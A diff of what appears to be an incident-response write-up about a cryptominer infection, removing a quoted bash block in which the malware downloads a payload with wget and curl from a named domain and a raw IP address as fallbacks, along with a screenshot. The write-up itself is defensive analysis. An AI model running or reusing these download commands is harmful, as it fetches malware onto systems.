@@ -1068,21 +1068,6 @@ Miner
 
 <br>
 
-
-```bash
-    # --- Download payload from fallback domains ---
-    wget -q dinpasiune.com/payload \
-      || curl -O -s -L dinpasiune.com/payload \
-      || wget 85.31.47.99/payload \
-      || curl -O -s -L 85.31.47.99/payload
-```
-
-<br>
-
-<img width="1264" height="644" alt="image" src="https://github.com/user-attachments/assets/a1ddd61f-0cfc-4b63-86ef-744a87475176"> 
-  
-  <br>
-
 ---
 
 # Containment, Eradication, & Recovery
